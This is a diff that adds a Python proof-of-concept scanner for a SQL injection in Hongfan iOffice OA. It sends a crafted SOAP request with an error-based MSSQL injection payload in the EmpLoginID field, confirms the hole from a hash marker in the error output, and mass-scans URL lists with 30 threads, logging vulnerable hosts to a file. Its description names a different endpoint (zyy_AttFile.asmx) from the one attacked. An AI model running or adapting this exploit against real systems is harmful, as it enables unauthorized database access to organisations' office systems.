@@ -1,0 +1,64 @@
+import requests,argparse,sys,time,re,os
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    test="""
+
+██  ██████  ███████ ███████ ██  ██████ ███████         ███████  ██████  ██      
+██ ██    ██ ██      ██      ██ ██      ██              ██      ██    ██ ██      
+██ ██    ██ █████   █████   ██ ██      █████           ███████ ██    ██ ██      
+██ ██    ██ ██      ██      ██ ██      ██                   ██ ██ ▄▄ ██ ██      
+██  ██████  ██      ██      ██  ██████ ███████ ███████ ███████  ██████  ███████ 
+                                                                   ▀▀           
+                                                                                                                                  
+"""
+    print(test)
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='红帆OA zyy_AttFile.asmx SQL注入漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as fb:
+            for url in fb.readlines():
+                url_list.append(url.strip())
+        mp = Pool(30)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    payload = '/iOffice/prg/set/wss/ioDesktopData.asmx'
+    header={
+        'Content-Type':'text/xml;charset=UTF-8',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/108.0.0.0Safari/537.36',
+        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+        'Accept-Encoding':'gzip,deflate',
+        'Upgrade-Insecure-Requests':'1',
+        'Content-Length':'507',
+        'Connection':'close',
+    }
+    proxies={
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+    data="<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\">\r\n<soap:Header/>\r\n<soap:Body>\r\n<tem:GetDepSchedule>\r\n<!--type: string-->\r\n<tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes(\'md5\',\'123\')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>\r\n</tem:GetDepSchedule>\r\n</soap:Body>\r\n</soap:Envelope>"
+    try:
+        res = requests.post(url=target+payload,headers=header,proxies=proxies,data=data,timeout=15,verify=False)
+        #print(res.text)
+        match = re.search(r"nvarchar 值 '([^']+)'",res.text)
+        #print(match.group(1))
+        if 'qvjzq0x202cb962ac59075b964b07152d234b70qvqxq' == match.group(1):
+            print(f'[+]{target} have loopholes {target+payload}')
+            with open('result.txt','a',encoding='utf-8') as fn:
+                fn.write(target.strip()+'\n')
+    except:
+        pass
+if __name__ == "__main__":
+    main()
